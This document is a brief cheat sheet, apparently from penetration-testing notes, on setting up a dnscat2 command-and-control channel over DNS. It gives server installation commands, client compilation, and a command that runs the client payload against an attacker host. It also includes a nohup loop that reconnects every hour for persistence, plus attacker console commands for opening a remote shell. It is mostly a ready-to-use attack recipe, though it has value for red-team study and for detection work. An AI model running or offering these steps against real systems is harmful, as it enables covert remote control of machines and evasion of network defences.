# dnscat2
```
This tool is designed to create an encrypted Commands and Control (C2) channel over the DNS protocol
```
* [dnscat2 github](https://github.com/iagox86/dnscat2)

## Setting up Server
```
sudo su -
apt-get update
apt-get install ruby-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
apt-get install gcc make
gem install bundler
bundle install
```

```
ruby ./dnscat2.rb
```
Encrypted with secret
```
ruby ./dnscat2.rb --secret fdgerhfdgtjydfy567d6d56e
```
```
Note: udp port at server side must allowed
```
## Compiling Client
```
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
cd /opt/dnscat2/client
make
```
Executing payload

```
./dnscat serveraddress.com --secret fdgerhfdgtjydfy567d6d56e
```
Executing timely (An Hour)
```
nohup /bin/bash -c "while true; do ./dnscat serveraddress.com --secret fdgerhfdgtjydfy567d6d56e --max-retransmits 5; sleep 3600; done" > /dev/null 2>&1 &
```

## Attacker Server side command
Show windows
```
>> window 
```
Interact with first command session
```
>> window -i 1
```
Start shell
```
>> shell
```
Back out main session
```
Ctrl-z
```
